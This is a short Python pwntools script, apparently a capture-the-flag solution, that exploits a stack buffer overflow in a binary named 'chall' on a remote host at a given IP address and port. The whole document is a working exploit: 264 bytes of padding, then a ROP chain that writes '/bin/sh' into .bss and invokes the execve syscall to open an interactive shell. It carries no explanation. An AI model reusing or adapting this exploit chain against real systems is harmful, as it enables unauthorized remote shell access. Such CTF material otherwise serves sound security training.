from pwn import *

elf = context.binary = ELF("./chall")
# p = process()
p = remote("103.167.132.234", 1122)
context.log_level = 'debug'

pop_rax_r15_r14 = 0x00000000004011b7
pop_rdi = 0x00000000004011c6
pop_rsi = 0x00000000004011bb
pop_rdx = 0x00000000004011d8
syscall = 0x00000000004011e1
addr_bss = elf.bss()
scanf_plt = 0x0000000000401060
format_spec = 0x000000000040201e
ret = 0x0000000000401016
mov_qwii = 0x00000000004011ad # mov qword ptr [rdi], rsi ; nop ; pop rbp ; ret

payload = b'a'*264
payload += p64(pop_rdi)
payload += p64(addr_bss)
payload += p64(pop_rsi)
payload += b'/bin/sh\x00'
payload += p64(mov_qwii)
payload += b'\x90'*8
payload += p64(ret)
payload += p64(pop_rax_r15_r14)
payload += p64(0x3b)
payload += p64(0x0)
payload += p64(0x0)
payload += p64(pop_rdx)
payload += p64(0x0)
payload += p64(pop_rsi)
payload += p64(0x0)
payload += p64(pop_rdi)
payload += p64(addr_bss)
payload += p64(syscall)

p.sendline(payload)
p.interactive()
